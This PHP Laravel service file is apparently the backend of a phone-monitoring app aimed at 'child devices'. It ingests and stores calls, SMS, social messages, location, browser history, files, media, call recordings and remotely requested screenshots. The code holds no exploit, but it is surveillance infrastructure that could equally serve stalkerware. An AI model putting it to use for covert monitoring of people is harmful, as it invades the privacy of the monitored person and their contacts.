<?php

namespace App\Services;

use App\Enums\CommandStatus;
use App\Enums\LocalStatus;
use App\Jobs\ProcessTelemetryBatch;
use App\Models\Device;
use App\Models\DeviceRemoteCommand;
use App\Models\DeviceRestrictionRule;
use Illuminate\Database\Eloquent\Collection;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

/**
 * Centralised sync ingestion engine for the /device/sync endpoint.
 *
 * Handles deduplication, chunked hash persistence, and async architecture.
 */
class DeviceSyncService extends Service
{
    /**
     * All supported telemetry channels.
     * Key   = payload key sent by the mobile.
     * table = target DB table for telemetry storage.
     * map   = private mapper method name.
     *
     * @var array<string, array{table: string, map: string}>
     */
    private const CHANNELS = [
        'calls' => ['table' => 'device_calls',           'map' => 'mapCall'],
        'sms' => ['table' => 'device_sms',             'map' => 'mapSms'],
        'contacts' => ['table' => 'device_contacts',        'map' => 'mapContact'],
        'notifications' => ['table' => 'device_notifications',   'map' => 'mapNotification'],
        'gps_locations' => ['table' => 'device_gps_locations',   'map' => 'mapGps'],
        'geofence_alerts' => ['table' => 'device_geofence_alerts', 'map' => 'mapGeofenceAlert'],
        'social_messages' => ['table' => 'device_social_messages', 'map' => 'mapSocial'],
        'browser_history' => ['table' => 'device_browser_history', 'map' => 'mapBrowser'],
        'installed_apps' => ['table' => 'device_installed_apps',  'map' => 'mapApp'],
        'files' => ['table' => 'device_files',           'map' => 'mapFile'],
        'media' => ['table' => 'device_media',           'map' => 'mapMedia'],
    ];

    /**
     * Process a validated sync payload from a child device (high performance ingestion).
     *
     * Uses chunked insertion of deduplication hashes to prevent SQL deadlocks and memory exhaustion.
     */
    public function processDeviceSync(mixed $device, array $payload): JsonResponse
    {
        if (! $device instanceof Device) {
            abort(401, 'Device unauthorized or missing context.');
        }

        $clearedByChannel = [];
        $deviceId = $device->id;

        foreach (self::CHANNELS as $channel => $meta) {
            // Skip absent or empty channels
            if (empty($payload[$channel]) || ! is_array($payload[$channel])) {
                continue;
            }

            $records = $payload[$channel];

            // ── 1. Extract unique hashes from this batch ──────────────────────
            $batchHashes = array_values(
                array_unique(array_column($records, 'sync_hash'))
            );

            if (empty($batchHashes)) {
                continue;
            }

            // ── 2. Mass-check: single SQL to find already-ingested hashes ─────
            $alreadyIngested = DB::table('ingested_payloads')
                ->where('device_id', $deviceId)
                ->whereIn('sync_hash', $batchHashes)
                ->pluck('sync_hash')
                ->all();

            $newHashes = array_values(array_diff($batchHashes, $alreadyIngested));

            // For already-ingested calls, update recorded_at if missing
            if ($channel === 'calls' && ! empty($alreadyIngested)) {
                $alreadySet = array_flip($alreadyIngested);
                foreach ($records as $record) {
                    if (! isset($alreadySet[$record['sync_hash']]) || empty($record['recorded_at'])) {
                        continue;
                    }
                    DB::table('device_calls')
                        ->where('device_id', $deviceId)
                        ->where('sync_hash', $record['sync_hash'])
                        ->update(['recorded_at' => $this->parseDate($record['recorded_at'])]);
                }
            }

            // For already-ingested SMS, update sms_status and deleted_at_source
            if ($channel === 'sms' && ! empty($alreadyIngested)) {
                $alreadySet = array_flip($alreadyIngested);
                foreach ($records as $record) {
                    if (! isset($alreadySet[$record['sync_hash']])) {
                        continue;
                    }
                    $updates = [];

                    // Resolve correct sms_status
                    $incomingStatus = $record['sms_status'] ?? null;
                    if (! $incomingStatus || $incomingStatus === 'received') {
                        $incomingStatus = ($record['type'] ?? 'inbox') === 'sent' ? 'delivered' : 'received';
                    }
                    if (in_array($incomingStatus, ['delivered', 'failed', 'draft', 'sending', 'queued'])) {
                        $updates['sms_status'] = $incomingStatus;
                    }

                    if (! empty($record['deleted_at_source'])) {
                        $updates['deleted_at_source'] = true;
                    }

                    if (! empty($updates)) {
                        DB::table('device_sms')
                            ->where('device_id', $deviceId)
                            ->where('sync_hash', $record['sync_hash'])
                            ->update($updates);
                    }
                }
            }

            // All hashes already processed — client can safely clear them
            if (empty($newHashes)) {
                $clearedByChannel[$channel] = $batchHashes;

                continue;
            }

            try {
                $now = now();
                $newHashSet = array_flip($newHashes); // O(1) lookup map

                // ── 3. Atomically acquire dedup lock (hash fingerprints) ───────
                $hashRows = array_map(
                    fn (string $hash): array => [
                        'sync_hash' => $hash,
                        'device_id' => $deviceId,
                        'payload_type' => $channel,
                        'created_at' => $now,
                        'updated_at' => $now,
                    ],
                    $newHashes
                );

                // Chunk lock insertions in batches of 500 to avoid SQL payload limits and memory spikes
                foreach (array_chunk($hashRows, 500) as $chunk) {
                    DB::table('ingested_payloads')->insert($chunk);
                }

                // ── 4. Map rows for new hashes only ───────────────────────────
                $mapper = $meta['map'];
                $telemetry = [];
                foreach ($records as $record) {
                    if (isset($newHashSet[$record['sync_hash']])) {
                        $telemetry[] = $this->$mapper($record, $deviceId, $now);
                    }
                }

                // ── 5. Dispatch async bulk-insert to Horizon telemetry queue ──
                if (! empty($telemetry)) {
                    ProcessTelemetryBatch::dispatch(
                        channel: $channel,
                        table: $meta['table'],
                        deviceId: $deviceId,
                        rows: $telemetry,
                        hashes: $newHashes,
                    );
                }

                // Report all hashes (new + pre-existing) as cleared
                $clearedByChannel[$channel] = $batchHashes;

            } catch (\Throwable $e) {
                // The dedup lock INSERT failed. Do NOT mark these hashes as cleared.
                Log::error('[DeviceSyncService] Failed to acquire dedup lock for channel', [
                    'channel' => $channel,
                    'device_id' => $deviceId,
                    'exception' => $e->getMessage(),
                ]);
            }
        }

        return response()->json([
            'success' => true,
            'cleared' => $clearedByChannel,
            'timestamp' => now()->toIso8601String(),
        ]);
    }

    /**
     * Persist the FCM token sent by the child device after Firebase init.
     */
    public function storeFcmToken(mixed $device, string $token): JsonResponse
    {
        if (! $device instanceof Device) {
            abort(401, 'Device unauthorized or missing context.');
        }

        $device->update(['fcm_token' => $token]);

        return response()->json(['success' => true]);
    }

    /**
     * Update device metadata (platform, brand, model, etc.) and touch updated_at.
     */
    public function heartbeat(mixed $device, array $data): JsonResponse
    {
        if (! $device instanceof Device) {
            abort(401, 'Device unauthorized or missing context.');
        }

        $fillable = array_filter([
            'platform'    => $data['platform'] ?? null,
            'brand'       => $data['brand'] ?? null,
            'model'       => $data['model'] ?? null,
            'os_version'  => $data['os_version'] ?? null,
            'app_version' => $data['app_version'] ?? null,
            'ip_address'  => request()->ip(),
        ], fn ($v) => $v !== null && $v !== '');

        $device->update($fillable);
        $device->touch();

        return response()->json(['success' => true, 'updated_at' => $device->updated_at->toIso8601String()]);
    }

    /**
     * Get restriction rules configured for the child device.
     */
    public function getRestrictionsForDevice(mixed $device): Collection
    {
        if (! $device instanceof Device) {
            abort(401, 'Device unauthorized or missing context.');
        }

        return DeviceRestrictionRule::where('device_id', $device->id)->get();
    }

    /**
     * Get pending remote commands for the child device.
     */
    public function getPendingCommandsForDevice(mixed $device): Collection
    {
        if (! $device instanceof Device) {
            abort(401, 'Device unauthorized or missing context.');
        }

        return DeviceRemoteCommand::where('device_id', $device->id)
            ->where('status', CommandStatus::PENDING)
            ->get();
    }

    /**
     * Respond to a specific remote command with status updates and physical file persistence.
     */
    public function respondToCommand(int $commandId, mixed $device, array $data): JsonResponse
    {
        if (! $device instanceof Device) {
            abort(401, 'Device unauthorized or missing context.');
        }

        $command = DeviceRemoteCommand::where('device_id', $device->id)
            ->where('id', $commandId)
            ->firstOrFail();

        $status = isset($data['status'])
            ? CommandStatus::from($data['status'])
            : CommandStatus::COMPLETED;

        // Handle physical binary file upload (screenshot, call recording audio) from React Native mobile client
        if (request()->hasFile('file')) {
            $file = request()->file('file');
            $fileName = Str::ulid().'.'.$file->getClientOriginalExtension();
            $path = $file->storeAs('devices/commands/results', $fileName, 'local');
            $data['result_url'] = $path;
        }

        $command->update([
            'status' => $status,
            'result_url' => $data['result_url'] ?? null,
        ]);

        return response()->json([
            'success' => true,
            'command_id' => $command->id,
            'status' => $command->status->value,
        ]);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Private telemetry row mappers.
    // ─────────────────────────────────────────────────────────────────────────

    private function parseDate(?string $value): ?string
    {
        if ($value === null || $value === '') {
            return null;
        }

        try {
            return Carbon::parse($value)->format('Y-m-d H:i:s');
        } catch (\Throwable) {
            return null;
        }
    }

    private function resolveLocalStatus(array $item): string
    {
        if (! isset($item['local_status'])) {
            return LocalStatus::PENDING->value;
        }

        $raw = $item['local_status'];

        if ($raw instanceof LocalStatus) {
            return $raw->value;
        }

        return LocalStatus::tryFrom((string) $raw)?->value ?? LocalStatus::PENDING->value;
    }

    private function mapCall(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'contact_name' => $item['contact_name'] ?? null,
            'phone_number' => $item['phone_number'],
            'call_type' => $item['call_type'],
            'duration' => $item['duration'],
            'recorded_at' => $this->parseDate($item['recorded_at'] ?? null),
            'call_recorded' => $item['call_recorded'] ?? false,
            'recording_path' => $item['recording_path'] ?? null,
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapSms(array $item, int $deviceId, Carbon $now): array
    {
        $smsStatus = $item['sms_status'] ?? null;
        if (! $smsStatus || $smsStatus === 'received') {
            $smsStatus = ($item['type'] ?? 'inbox') === 'sent' ? 'delivered' : 'received';
        }

        return [
            'device_id' => $deviceId,
            'address' => $item['address'],
            'body' => Crypt::encryptString($item['body'] ?? ''),
            'type' => $item['type'],
            'sms_status' => $smsStatus,
            'date' => $this->parseDate($item['date'] ?? null),
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapContact(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'name' => $item['name'],
            'phone_number' => $item['phone_number'],
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapNotification(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'package_name' => $item['package_name'],
            'title' => $item['title'] ?? null,
            'body' => ($item['body'] ?? null) !== null ? Crypt::encryptString($item['body']) : null,
            'date' => $this->parseDate($item['date'] ?? null),
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapGps(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'latitude' => $item['latitude'],
            'longitude' => $item['longitude'],
            'altitude' => $item['altitude'] ?? null,
            'accuracy' => $item['accuracy'] ?? null,
            'recorded_at' => $this->parseDate($item['recorded_at'] ?? null),
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapGeofenceAlert(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'geofence_id' => $item['geofence_id'],
            'event_type' => $item['event_type'],
            'latitude' => $item['latitude'],
            'longitude' => $item['longitude'],
            'triggered_at' => $this->parseDate($item['triggered_at'] ?? null),
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapSocial(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'platform' => $item['platform'],
            'sender_name' => $item['sender_name'],
            'message' => Crypt::encryptString($item['message'] ?? ''),
            'date' => $this->parseDate($item['date'] ?? null),
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapBrowser(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'url' => $item['url'],
            'title' => $item['title'] ?? null,
            'visited_at' => $this->parseDate($item['visited_at'] ?? null),
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapApp(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'app_name' => $item['app_name'],
            'package_name' => $item['package_name'],
            'installed_at' => $this->parseDate($item['installed_at'] ?? null),
            'is_blocked' => $item['is_blocked'] ?? false,
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapFile(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'path' => $item['path'],
            'file_name' => $item['file_name'],
            'file_size' => $item['file_size'],
            'is_directory' => $item['is_directory'] ?? false,
            'file_created_at' => $this->parseDate($item['file_created_at'] ?? null),
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }

    private function mapMedia(array $item, int $deviceId, Carbon $now): array
    {
        return [
            'device_id' => $deviceId,
            'media_type' => $item['media_type'],
            'origin_app' => $item['origin_app'],
            'file_name' => $item['file_name'],
            'file_size' => $item['file_size'],
            'path' => $item['path'],
            'sync_hash' => $item['sync_hash'],
            'local_sqlite_id' => $item['local_sqlite_id'],
            'local_status' => $this->resolveLocalStatus($item),
            'deleted_at_source' => $item['deleted_at_source'] ?? false,
            'created_at' => $now,
            'updated_at' => $now,
        ];
    }
}
